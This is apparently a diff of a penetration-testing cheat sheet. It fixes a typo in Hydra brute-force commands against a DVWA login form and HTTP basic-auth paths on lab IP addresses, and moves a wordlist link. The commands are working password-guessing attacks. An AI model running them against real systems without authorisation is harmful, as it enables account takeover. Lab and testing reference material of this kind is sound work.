@@ -76,18 +76,20 @@ It also helps if you know the required username format. For instance if username
 Make sure to keep the username lists small or test a single username like "admin".
 
 ```bash
-# example wordlists ( [seclists](https://github.com/danielmiessler/SecLists) )
+# example wordlists
 export userlist=/usr/share/seclists/Usernames/top-usernames-shortlist.txt
 export passlist=/usr/share/seclists/Passwords/darkweb2017-top10000.txt
 
 # HTTP Post Form
 hydra -L $userlist -P $passlist 10.10.13.37 http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”
-hydra --l admin -P $passlist 10.10.13.37 http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”
+hydra -l admin -P $passlist 10.10.13.37 http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”
 
 # HTTP Basic Auth
 hydra -L $userlist -P $passlist 10.10.13.37 http-get /somesecurepath/
 hydra -l admin -P $passlist -s 9007 -f 10.10.10.218 http-get /somesecurepath/
 ```
+
+* [seclists wordlists github repo](https://github.com/danielmiessler/SecLists)
 
 #### With WFuzz:
 
